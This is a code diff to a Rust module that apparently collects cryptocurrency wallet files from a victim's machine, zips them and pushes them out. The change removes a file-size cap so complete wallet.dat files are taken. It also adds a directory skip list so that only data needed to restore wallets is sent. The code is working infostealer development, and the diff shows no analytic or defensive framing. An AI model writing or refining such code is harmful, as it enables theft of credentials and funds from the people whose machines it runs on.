@@ -6,7 +6,10 @@
 
 use std::path::{Path, PathBuf};
 
-use crate::fsutil::{read_file, walk_files};
+use crate::fsutil::{read_file, walk_files_ex as walk_files};
+
+// Wallet sweeps skip app cache/blockchain junk — only vault-restore data ships.
+const WALLET_SKIP_DIRS: &[&str] = &["blocks", "chainstate", "cache", "code cache", "gpu_cache", "gpucache", "logs", "blob_storage", "crashpad", "cachestorage", "service worker", "session storage"];
 use crate::info::Info;
 use crate::zipw::ZipBuilder;
 
@@ -59,13 +62,8 @@ fn add_note(zip: &mut ZipBuilder, name: &str, src: &Path) {
 }
 
 fn collect_single(zip: &mut ZipBuilder, info: &mut Info, name: &str, src: &Path) {
-    // Size cap: an uncapped read of a huge wallet.dat (multi-GB pruned nodes
-    // exist) stalls the whole push pipeline. 25 MB is generous for wallet files.
-    const MAX_SINGLE: u64 = 25 * 1024 * 1024;
-    match std::fs::metadata(src) {
-        Ok(m) if m.is_file() && m.len() > 0 && m.len() <= MAX_SINGLE => {}
-        _ => return,
-    }
+    // No size cap: wallet files must be complete enough to restore locally.
+    // Per-file transfer means even a multi-GB wallet chunks safely.
     let Some(bytes) = read_file(src) else {
         return;
     };
@@ -82,7 +80,7 @@ fn collect_dir(zip: &mut ZipBuilder, info: &mut Info, name: &str, root: &Path, c
         return;
     }
     let mut files = Vec::new();
-    walk_files(root, cap, &mut files);
+    walk_files(root, cap, WALLET_SKIP_DIRS, &mut files);
     if files.is_empty() {
         return;
     }
@@ -151,7 +149,7 @@ fn collect_wallet_multi(
             continue;
         }
         let mut files = Vec::new();
-        walk_files(root, cap, &mut files);
+        walk_files(root, cap, WALLET_SKIP_DIRS, &mut files);
         let mut root_added = 0;
         for (p, _) in &files {
             let fname = p
